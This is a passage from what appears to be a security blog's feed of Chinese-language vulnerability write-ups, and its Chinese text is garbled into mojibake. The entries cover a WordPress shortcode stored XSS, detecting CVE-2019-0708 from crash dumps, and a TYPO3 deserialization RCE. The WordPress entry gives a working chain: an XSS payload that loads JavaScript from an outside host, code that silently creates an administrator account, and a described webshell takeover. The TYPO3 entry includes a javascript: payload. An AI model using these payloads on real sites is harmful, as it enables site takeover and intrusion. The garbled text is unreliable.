ï¼‰é”™è¯¯æ¶ˆæ¯ä¸­çš„JavaScript/HTMLä»£ç ã€‚å¦‚æœè¿œç¨‹æ”»å‡»è€…å…·å¤‡Contributorï¼ˆè´¡çŒ®è€…ï¼‰æˆ–è€…æ›´é«˜æƒé™ï¼Œå½“å—å®³è€…è®¿é—®è¢«æ”»å‡»çš„ç½‘é¡µæ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨å—å®³è€…æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScript/HTMLä»£ç ã€‚å¦‚æœå—å®³è€…å…·å¤‡æ›´é«˜æƒé™ï¼ˆæ¯”å¦‚ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œæ”»å‡»è€…ç”šè‡³å¯ä»¥æ”»ç ´æ•´ä¸ªwebæœåŠ¡å™¨ã€‚</p><p>è¿™ä¸ªå­˜å‚¨å‹XSSæ¼æ´å½±å“5.0è‡³5.2.2ç‰ˆçš„WordPressã€‚</p><h2 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01 æ¼æ´åˆ†æ"></a>0x01 æ¼æ´åˆ†æ</h2><p>åœ¨WordPress 5.0ä¸­ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ–‡ç« ï¼ˆpostï¼‰ä¸­æ·»åŠ Shortcodeå—ï¼ˆblockï¼‰ã€‚å½“åœ¨Shortcodeå—ä¸­æ·»åŠ ç‰¹å®šçš„HTMLç¼–ç å­—ç¬¦ï¼ˆæ¯”å¦‚&lt;ï¼‰ç„¶åé‡æ–°æ‰“å¼€è¯¥æ–‡ç« æ—¶ï¼ŒWordPresså°±ä¼šæ˜¾ç¤ºä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œå°†&lt;è§£ç æˆ&lt;ç„¶åå±•ç¤ºé¢„è§ˆã€‚</p><p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>å›¾1. åœ¨Shortcodeå—ä¸­æ’å…¥HTMLç¼–ç å­—ç¬¦</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>å›¾2. Shortcodeé”™è¯¯æ¶ˆæ¯é¢„è§ˆ</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>â€œ&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>è¿™æ®µPoCä»£ç è½»æ¾ç»•è¿‡é¢„è§ˆè§†å›¾ä¸­çš„XSSè¿‡æ»¤å™¨ã€‚</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>å›¾3. å°†PoCä»£ç æ’å…¥Shortcodeå—</p><p>å½“å—å®³è€…æŸ¥çœ‹è¯¥æ–‡ç« æ—¶ï¼Œå°±ä¼šåœ¨æµè§ˆå™¨ä¸­æ‰§è¡ŒXSSä»£ç ã€‚</p><p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>å›¾4. WordPress Shortcodeé¢„è§ˆXSS</p><p>å¦‚æœå—å®³è€…åˆšå¥½å…·å¤‡ç®¡ç†å‘˜æƒé™ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ¥è·å–ç®¡ç†å‘˜è´¦æˆ·çš„æ§åˆ¶æƒï¼Œåˆ©ç”¨WordPresså†…ç½®çš„å‡½æ•°æ‹¿åˆ°shellï¼Œè¿›ä¸€æ­¥æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨ã€‚</p><p>æ¯”å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±çš„webæœåŠ¡å™¨ä¸Šæ‰˜ç®¡ä¸€ä¸ªJavaScriptæ–‡ä»¶ï¼ˆè¿™é‡Œä»¥wpaddadmin.jsä¸ºä¾‹ï¼‰ï¼Œè¿™æ®µJavaScriptä»£ç ä¼šæ·»åŠ ä¸€ä¸ªWordPressç®¡ç†å‘˜è´¦æˆ·ï¼Œç”¨æˆ·åä¸ºattackï¼Œå¯†ç ä¸ºattackã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure><p>ç„¶åæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¦‚ä¸‹PoCæ¥æ’å…¥JavaScriptã€‚</p><p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>å›¾5. æ’å…¥XSSä»£ç ä»¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</p><p>ä¸€æ—¦å…·å¤‡é«˜æƒé™çš„å—å®³è€…æŸ¥çœ‹è¯¥æ–‡ç« ï¼Œå°±ä¼šåˆ›å»ºattackerç®¡ç†å‘˜è´¦æˆ·ã€‚<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>å›¾6. æ‰§è¡ŒXSSä»£ç </p><p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>å›¾7. XSSä»£ç æˆåŠŸåˆ›å»ºå…·å¤‡ç®¡ç†å‘˜æƒé™çš„attackerè´¦æˆ·</p><p>éšåæ”»å‡»è€…å¯ä»¥ä¿®æ”¹å·²æœ‰çš„phpæ–‡ä»¶ï¼Œæ”¹æˆwebshellä»£ç ï¼Œä»¥ä¾¿æ¥ç®¡ç›®æ ‡webæœåŠ¡å™¨ã€‚</p><p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p><p>å›¾8. ä½¿ç”¨æ”»å‡»è€…è´¦æˆ·æ·»åŠ webshell</p><p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>å›¾9. æ§åˆ¶webæœåŠ¡å™¨</p><h2 id="0x02-è§£å†³æ–¹æ¡ˆ"><a href="#0x02-è§£å†³æ–¹æ¡ˆ" class="headerlink" title="0x02 è§£å†³æ–¹æ¡ˆ"></a>0x02 è§£å†³æ–¹æ¡ˆ</h2><p>FortiGuard Labså‘WordPressåé¦ˆäº†è¿™ä¸ª0dayæ¼æ´ï¼Œå®˜æ–¹å¾ˆå¿«å‘å¸ƒäº†ç›¸åº”è¡¥ä¸ã€‚å¦‚æœå¤§å®¶æ­£åœ¨ä½¿ç”¨å­˜åœ¨æ¼æ´çš„WordPressç‰ˆæœ¬ï¼Œè¯·å°½å¿«å‡çº§åˆ°æœ€æ–°ç‰ˆï¼Œæˆ–è€…åŠæ—¶æ‰“ä¸Šè¡¥ä¸ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç®€å•åˆ¤æ–­æ˜¯å¦æ˜¯cve-2019-0708æ”»å‡»</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« è½¬è‡ª<a href="https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352684&amp;idx=1&amp;sn=0e845ce5ee2c7f210d89e1566b39e0e5" title="ä¸­å›½ç™½å®¢è”ç›Ÿ" target="_blank" rel="noopener">ä¸­å›½ç™½å®¢è”ç›Ÿ</a></p><hr><p>ä»Šæ—©ä¸€èµ·åºŠï¼Œå‘ç°cve-2019-0708 expå·²ç»å…¬å¼€ã€‚ä½†æ˜¯ä½œä¸ºå®‰æœäººå‘˜ï¼Œæ”»å‡»æ˜¯ä¸€å›äº‹ï¼Œåº”æ€¥åˆæ˜¯å¦ä¸€å¤§å›äº‹ã€‚è¿™é‡Œå°±ç®€å•æ¥åˆ¤æ–­å—å®³è€…æœºå™¨æ˜¯å¦å—åˆ°äº†cve-2019-0708æ”»å‡»ã€‚</p><p>å› ä¸ºcve-2019-0708è¿™ç±»æ˜¯æº¢å‡ºç±»æ”»å‡»ï¼Œæ‰€ä»¥è·Ÿms17-010ã€ms12-020ä¸€æ ·ï¼Œæœ‰ä¸€å®šçš„å‡ ç‡æŠŠæœºå™¨æ‰“è“å±ï¼Œè¿™é‡Œä»¥è“å±æ–‡ä»¶ä¸ºä¾‹ä½œä¸ºåˆ†æã€‚</p><p>é¦–å…ˆå®‰è£…windbgï¼Œæ·»åŠ ç¬¦å·è¡¨<br><img src="https://tva1.sinaimg.cn/large/005R6Otmly1g6tf36icqcj30nd08mq53.jpg" alt><br><code>set _NT_SYMBOL_PATH=srv*DownstreamStore*https://msdl.microsoft.com/download/symbols</code><br>æ‰“å¼€è“å±æ–‡ä»¶ï¼Œæˆ‘çš„win7é»˜è®¤åœ¨<br><code>C:\Windows\Minidump</code></p><p>é¦–å…ˆæˆ‘åˆ©ç”¨cve-2019-0708æŠŠæˆ‘æœºå™¨æ‰“è“å±ï¼Œæ‰“å¼€è¯¥è“å±dmpæ–‡ä»¶ï¼Œå…³æ³¨debug session timeã€system uptimeï¼Œå¯ä»¥çœ‹åˆ°è¯¥æœºå™¨è¿è¡Œäº†4åˆ†é’Ÿï¼Œåœ¨10:00å·¦å³å‡ºç°è“å±äº‹ä»¶ï¼š<br><img src="https://ws3.sinaimg.cn/large/005R6Otmly1g6tf36pi9wj30mu05g767.jpg" alt><br>è¾“å…¥</p><p><code>!analyze -v</code><br>çœ‹åˆ°è“å±ä»£ç <br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf36v2gpj30o302y0tc.jpg" alt><br>è“å±ä»£ç é€ æˆåŸå› ï¼š</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37055uj30mn01kt90.jpg" alt></p><p>å…³æ³¨PROCESS_NAMEï¼Œä»£è¡¨å¯¼è‡´ç³»ç»Ÿè“å±çš„è¿›ç¨‹ï¼š</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37fasyj30nh05vwfy.jpg" alt></p><p>FOLLOWUP_IPï¼Œé”™è¯¯æŒ‡ä»¤ä½ç½®</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37md3jj30o704faas.jpg" alt></p><p>æŸ¥çœ‹å‡ºé”™é©±åŠ¨ï¼Œrdpwd.sysï¼Œå¯ä»¥é€šè¿‡ç½‘ä¸Šæœç´¢å¯¹åº”æ¼æ´åˆ†ææ–‡ç« ï¼ŒæŸ¥çœ‹å¯¹ç”¨çš„é©±åŠ¨æ˜¯å¦å—å½±å“<br><code>lmvm RDPWD</code><br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38grlmj30ns07mq6d.jpg" alt></p><p>è¿™æ˜¯ms12-020æ‰“çš„</p><p><img src="https://ws1.sinaimg.cn/large/005R6Otmly1g6tf38ol3sj30n9024wfc.jpg" alt></p><p>è¿™æ˜¯ms17-010æ‰“çš„<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38vddfj30mx05ygmg.jpg" alt></p><p>å¯è§ä¸åŒçš„æ”»å‡»æ‰‹æ³•å¾—åˆ°çš„è“å±æ–‡ä»¶ç»“æœä¸ä¸€æ ·çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡åˆ†æè“å±æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å—åˆ°äº†å“ªç§æ”»å‡»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12747ï¼šTYPO3 9.5.7 RCEæ¼æ´åˆ†æ</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>è¯‘æ–‡å£°æ˜:<br>æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€…ripstechï¼Œæ–‡ç« æ¥æºï¼šblog.ripstech.com<br>åŸæ–‡åœ°å€ï¼š<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database" target="_blank" rel="noopener">https://blog.ripstech.com/2019/typo3-overriding-the-database</a><br>è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†</strong><br><img src="https://p2.ssl.qhimg.com/t01cb51d1cb54b0010f.png" alt></p><h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ç ”ç©¶TYPO3 CMSçš„æ ¸å¿ƒä¸­çš„ä¸€ä¸ªå…³é”®æ¼æ´ï¼Œè¯¥æ¼æ´é€šè¿‡ä»£ç å®¡è®¡æŒ–æ˜è€Œå‡ºã€‚è¯¥æ¼æ´ä½¿å¾—ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·èƒ½å¤Ÿåœ¨åº•å±‚ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚</p><p>å—è¯¥æ¼æ´å½±å“çš„ç‰ˆæœ¬æ˜¯TYPO3 8.xåˆ°8.7.26ï¼Œä»¥åŠTYPO3 9.xåˆ°9.5.7ã€‚å¯¹ä¸å¯ä¿¡æ•°æ®çš„ååºåˆ—åŒ–ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å¯ä»¥ä¸åç«¯ä¸­æ£€æµ‹åˆ°çš„è·¨ç«™è„šæœ¬æ¼æ´(CVE-2019-12748)ç›¸ç»“åˆã€‚</p><p>RIPæ‰«ææŠ¥å‘Šï¼ˆ<a href="https://demo.ripstech.com/scan/109/165ï¼‰" target="_blank" rel="noopener">https://demo.ripstech.com/scan/109/165ï¼‰</a></p><h2 id="0x02-ä½¿ç”¨payloadè¦†ç›–æ•°æ®åº“"><a href="#0x02-ä½¿ç”¨payloadè¦†ç›–æ•°æ®åº“" class="headerlink" title="0x02 ä½¿ç”¨payloadè¦†ç›–æ•°æ®åº“"></a>0x02 ä½¿ç”¨payloadè¦†ç›–æ•°æ®åº“</h2><p>åœ¨TYPO3çš„åç«¯éƒ¨åˆ†ä¿å­˜ä»»ä½•è¡¨å•æ—¶å°†ä¼šå‘ç”Ÿæ­¤æ¼æ´ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·ä¿®æ”¹äº†pageséƒ¨åˆ†ï¼Œåˆ™å¯ä»¥ä»TYPO3çš„SQLæ•°æ®åº“ä¸­æå–è¦ç¼–è¾‘çš„æ•°æ®å¹¶å°†å…¶å†™å›æ•°æ®åº“ã€‚åœ¨ä»æ•°æ®åº“è·å–æ•°æ®ä¹‹åï¼Œåº”ç”¨é€»è¾‘å…è®¸é€šè¿‡ç”¨æˆ·çš„è¾“å…¥è¦†ç›–æ‰€è·å–æ•°æ®çš„å•åˆ—ã€‚æ­¤ç‰¹å¾å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„æ¶æ„åç«¯ç”¨æˆ·è¦†ç›–åŒ…å«åºåˆ—åŒ–æ•°æ®çš„æ•°æ®åº“å€¼ï¼Œè¿™äº›æ•°æ®ç¨åä¼šååºåˆ—åŒ–ã€‚è¿™å°†ä¼šå¯¼è‡´PHPå¯¹è±¡æ³¨å…¥ï¼Œæœ€ç»ˆæ”»å‡»è€…å¯ä»¥è¿œç¨‹æ‰§è¡Œä»£ç ï¼ˆCVE-2019-12747ï¼‰ã€‚</p><p>æ”»å‡»è§†é¢‘ï¼ˆ<a href="https://blog.ripstech.com/videos/typo3_957.mp4ï¼‰" target="_blank" rel="noopener">https://blog.ripstech.com/videos/typo3_957.mp4ï¼‰</a></p><h2 id="0x03-æŠ€æœ¯ç»†èŠ‚"><a href="#0x03-æŠ€æœ¯ç»†èŠ‚" class="headerlink" title="0x03 æŠ€æœ¯ç»†èŠ‚"></a>0x03 æŠ€æœ¯ç»†èŠ‚</h2><p>åœ¨TYPO3ä¸­ä¿å­˜åç«¯è¡¨å•æ—¶ï¼Œå°†è°ƒç”¨$formDataCompilerå¯¹è±¡çš„compile()æ–¹æ³•ã€‚å‚æ•°æ˜¯ä¸€ä¸ªä½¿ç”¨ç”¨æˆ·è¾“å…¥å¡«å……çš„æ•°ç»„ï¼Œå¦‚ä¸‹ç¬¬8è¡Œæ‰€ç¤ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Controller/EditDocumentController.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $this-&gt;overrideVals = $parsedBody[&apos;overrideVals&apos;] ?? </span><br><span class="line">    $queryParams[&apos;overrideVals&apos;] ?? null;</span><br><span class="line">  // ... </span><br><span class="line">  $formDataCompilerInput[&apos;overrideValues&apos;] = $this-&gt;overrideVals[$table];</span><br><span class="line">  $formData = $formDataCompiler-&gt;compile($formDataCompilerInput);</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ä½¿ç”¨for-loopéå†ä¸€ä¸ªæœ‰åºçš„FormDataProviderå¯¹è±¡åˆ—è¡¨ï¼Œå¹¶æŒ‰é¡ºåºåœ¨æ¯ä¸ª$providerå¯¹è±¡ä¸Šè°ƒç”¨addData()æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">public function compile(array $result): array</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  foreach ($orderedDataProvider as $providerClassName =&gt; $providerConfig) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    $result = $provider-&gt;addData($result);</span><br><span class="line">  &#125;</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç çš„ç¬¬9è¡Œï¼Œ$provider-&gt;addData()çš„å‚æ•°$resultåœ¨ä¸‹é¢çš„addData()æ–¹æ³•è°ƒç”¨ä½œä¸ºå…¶å‚æ•°ã€‚åœ¨æ¯æ¬¡è¿­ä»£æ—¶ï¼Œå˜é‡$resultè¡¨ç¤ºæ•°ç»„åœ¨$providerå¤„ç†å®Œå…¶å†…å®¹åè¢«ä¿®æ”¹ã€‚å…¶ä¸­ä¸€ä¸ªprovidersæ˜¯DatabaseRecordOverrideValuesç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¯¥ç±»å…è®¸è¦†ç›–ä»æ•°ç»„$resultä¸­æå–çš„æ•°æ®ï¼Œå…¶ä¸­æ•°ç»„çš„è¡Œåˆ—å€¼åˆ†åˆ«ä¸ºdatabaseRowå’Œä»»æ„keyå€¼ã€‚</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($result[&apos;overrideValues&apos;] as $fieldName =&gt; $fieldValue) &#123;</span><br><span class="line">        if (isset($result[&apos;processedTca&apos;][&apos;columns&apos;][$fieldName])) &#123;</span><br><span class="line">            $result[&apos;databaseRow&apos;][$fieldName] = $fieldValue;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œä¸‹åˆ—FormDataProviderå¯¹è±¡ä¹‹ä¸€å®ç°äº†unserialize()æ–¹æ³•å¯¹è¢«è¦†ç›–æ•°æ®çš„è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´æ¼æ´ï¼š</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  if (/*...*/) </span><br><span class="line">  &#123;</span><br><span class="line">    $result[&apos;defaultLanguageDiffRow&apos;][$defaultLanguageKey] = unserialize(</span><br><span class="line">        $result[&apos;databaseRow&apos;][$result[&apos;processedTca&apos;][&apos;ctrl&apos;]</span><br><span class="line">        [&apos;transOrigDiffSourceField&apos;]]);</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæ˜¯æœ‰å…³å¦‚ä½•é€šè¿‡å·¥å…·é“¾expoit PHPå¯¹è±¡æ³¨å…¥çš„æ›´å¤šä¿¡æ¯çš„é“¾æ¥ï¼š ï¼ˆ<a href="https://blog.ripstech.com/2018/php-object-injectionï¼‰" target="_blank" rel="noopener">https://blog.ripstech.com/2018/php-object-injectionï¼‰</a></p><h2 id="0x04-CVE-2019-12748ï¼šåœ¨åç«¯çš„å­˜å‚¨å‹XSS"><a href="#0x04-CVE-2019-12748ï¼šåœ¨åç«¯çš„å­˜å‚¨å‹XSS" class="headerlink" title="0x04 CVE-2019-12748ï¼šåœ¨åç«¯çš„å­˜å‚¨å‹XSS"></a>0x04 CVE-2019-12748ï¼šåœ¨åç«¯çš„å­˜å‚¨å‹XSS</h2><p>CMS TYPO3çš„åç«¯ä¸­å­˜åœ¨è·¨ç«™è„šæœ¬æ¼æ´ï¼ˆCVE-2019-12748ï¼‰ã€‚æœ‰æƒè®¿é—®Site Redirectséƒ¨åˆ†çš„éç‰¹æƒç”¨æˆ·å¯ä»¥åˆ©ç”¨t3://ä¼ªåè®®æ³¨å…¥ä¸€ä¸ªæ¶æ„çš„URLã€‚<br><code>t3://url/?url=javascript:alert(1);</code><br>é€šè¿‡æ·»åŠ è¿™ä¸ªç‰¹å®šçš„ç«™ç‚¹ï¼Œå¯ä»¥é‡å®šå‘å¦ä¸€ä¸ªæ‹¥æœ‰æ›´é«˜æƒé™çš„TYPO3ç”¨æˆ·ï¼Œä»è€Œè¯±ä½¿ä»–ä»¬ç‚¹å‡»è§¦å‘æ¶æ„JavaScriptçš„é“¾æ¥ã€‚æ”»å‡»è€…å¯ä»¥å°†æ­¤æ¼æ´ä½œä¸ºå¯åŠ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ”»å‡»çš„æ”¯ç‚¹ã€‚</p><p>TYPO3ä¼šé˜»æ­¢ç”¨æˆ·åˆ©ç”¨é“¾æ¥å’ŒURLä¸­å±é™©çš„javascript:ä¼ªåè®®ï¼Œè¿™æ„å‘³ç€TYPO3å°†ç›´æ¥æ‰§è¡ŒJavaScriptã€‚ä½†æ˜¯ï¼Œå®ƒå¹¶ä¸é˜»æ­¢ç”¨æˆ·åˆ©ç”¨TYPO3çš„å†…ç½®t3://ä¼ªåè®®ï¼Œè¯¥åè®®å®ç°äº†å¤šç§åŠŸèƒ½ï¼Œä¾‹å¦‚å¼•ç”¨TYPO3å†…éƒ¨é¡µé¢ï¼Œæ–‡ä»¶ï¼Œé‚®ä»¶åœ°å€æˆ–URLsã€‚å®é™…ä¸Šï¼ŒæŒ‡å®šä¸€ä¸ªè‡ªåŠ¨è½¬æ¢ä¸ºå¯ç‚¹å‡»é“¾æ¥çš„URLå°†ç»•è¿‡TYPO3çš„ç™½åå•ï¼Œè¯¥ç™½åå•æœ€åˆçš„ä½œç”¨æ˜¯é˜»æ­¢javascript:ä¼ªåè®®ã€‚</p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>æœ¬æ–‡æ‰€è¿°çš„æ¼æ´ä¼šå¯¹å…·æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªTYPO3åç«¯çš„ç”¨æˆ·çš„TYPO3ç³»ç»Ÿäº§ç”Ÿä¸¥é‡çš„å½±å“ã€‚ç»è¿‡èº«ä»½éªŒè¯å¹¶ä¸”å¯ä»¥è®¿é—®Pageséƒ¨åˆ†çš„åç«¯ç”¨æˆ·å¯ä»¥åœ¨åº•å±‚è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨Site Redirectsæ¨¡å—ä¸­çš„è·¨ç«™è„šæœ¬æ¼æ´ä½œä¸ºåˆ©ç”¨æ­¤æ¼æ´çš„æ”¯ç‚¹ã€‚</p><h2 id="0x06-æ—¶é—´çº¿"><a href="#0x06-æ—¶é—´çº¿" class="headerlink" title="0x06 æ—¶é—´çº¿"></a>0x06 æ—¶é—´çº¿</h2><p>2019å¹´5æœˆ9æ—¥ï¼šæäº¤æ¼æ´<br>2019å¹´5æœˆ9æ—¥ï¼šæ¼æ´ç¡®è®¤<br>2019å¹´5æœˆ10æ—¥ï¼šä¸å‚å•†å®‰å…¨è´Ÿè´£äººåè°ƒè§£å†³é—®é¢˜<br>2019å¹´6æœˆ6æ—¥ï¼šå‚å•†é€šçŸ¥6æœˆ25å·å‘å¸ƒè¡¥ä¸<br>2019å¹´6æœˆ25æ—¥ï¼šTYPO3 9.5.8è¡¥ä¸å‘å¸ƒ</p><h2 id="0x07-å‚è€ƒæ–‡çŒ®"><a href="#0x07-å‚è€ƒæ–‡çŒ®" class="headerlink" title="0x07 å‚è€ƒæ–‡çŒ®"></a>0x07 å‚è€ƒæ–‡çŒ®</h2><p>WordPress 5.1 CSRF to Remote Code Executionï¼š</p><p><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-csrf-to-rce</a></p><p>Magento 2.3.1: Unauthenticated Stored XSS to RCEï¼š</p><p><a href="https://blog.ripstech.com/2019/magento-rce-via-xss" target="_blank" rel="noopener">https://blog.ripstech.com/2019/magento-rce-via-xss</a></p><p>MyBB &lt;= 1.8.20: From Stored XSS to RCEï¼š</p><p><a href="https://blog.ripstech.com/2019/mybb-stored-xss-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/mybb-stored-xss-to-rce</a></p><p>WordPress 5.0.0 Remote Code Executionï¼š</p><p><a 